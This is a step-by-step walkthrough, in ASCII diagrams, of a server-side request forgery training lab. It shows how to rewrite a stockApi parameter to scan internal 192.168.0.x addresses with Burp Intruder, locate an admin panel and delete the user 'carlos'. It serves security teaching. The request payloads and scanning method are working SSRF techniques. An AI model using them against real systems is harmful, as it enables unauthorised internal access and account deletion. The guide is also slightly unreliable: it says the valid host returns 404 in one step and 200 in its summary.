```text
================================================================================
             LAB: Basic SSRF Against Another Back-End System
================================================================================

Objective
---------
Find the internal admin panel running on:
    192.168.0.X:8080

Then delete the user:
    carlos

================================================================================
STEP 1 - Visit Product Page
================================================================================

          +--------------------------------------+
          |          Product Web Page            |
          |                                      |
          |     [ Check Stock ]  <-- Click       |
          +--------------------------------------+
                        |
                        |
                        V

================================================================================
STEP 2 - Capture Request in Burp Suite
================================================================================

Browser
   |
   V
+-------------------+
| Burp Proxy        |
| Intercept ON      |
+-------------------+
          |
          V

Captured Request

GET /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check


          |
          |
          V

Right Click
      |
      +----> Send to Intruder

================================================================================
STEP 3 - Modify stockApi Parameter
================================================================================

Original

http://stock.weliketoshop.net:8080/product/stock/check


Replace With

http://192.168.0.1:8080/admin


Highlight ONLY the last octet

http://192.168.0.§1§:8080/admin


Example

192.168.0.§1§
            ^
        Payload Position

================================================================================
STEP 4 - Configure Intruder
================================================================================

Intruder
│
├── Payload Type
│      Numbers
│
├── From
│      1
│
├── To
│      255
│
└── Step
       1


Result

192.168.0.1
192.168.0.2
192.168.0.3
...
192.168.0.255

                     |
                     |
                     V

              Start Attack

================================================================================
STEP 5 - Find the Valid Host
================================================================================

Attack Results

+------------+-----------+
| IP         | Status    |
+------------+-----------+
| .1         | 500       |
| .2         | 500       |
| .3         | 500       |
| .4         | 500       |
| .5         | 404   <-- |
| .6         | 500       |
+------------+-----------+

Only ONE request returns

HTTP 404 Not Found

That host contains the admin interface.

Example

http://192.168.0.5:8080/admin

================================================================================
STEP 6 - Send Valid Request to Repeater
================================================================================

Intruder
     |
     |
     +------> Send to Repeater

================================================================================
STEP 7 - Delete User Carlos
================================================================================

Current URL

http://192.168.0.5:8080/admin


Change To

http://192.168.0.5:8080/admin/delete?username=carlos


                    |
                    |
                    V

          Send Request

Server Response

HTTP/1.1 302 Found

(or)

HTTP/1.1 200 OK


User "carlos" Deleted

================================================================================
COMPLETE ATTACK FLOW
================================================================================

               User
                 |
                 V
        Open Product Page
                 |
                 V
         Click Check Stock
                 |
                 V
          Burp Proxy Capture
                 |
                 V
          Send to Intruder
                 |
                 V
 Replace stockApi with

 http://192.168.0.§X§:8080/admin

                 |
                 V
      Scan X = 1 → 255
                 |
                 V
      Find HTTP 200 Response
                 |
                 V
      Send to Repeater
                 |
                 V
 Change URL to

 /admin/delete?username=carlos

                 |
                 V
        Send Request
                 |
                 V
      ✔ Lab Solved
================================================================================
```
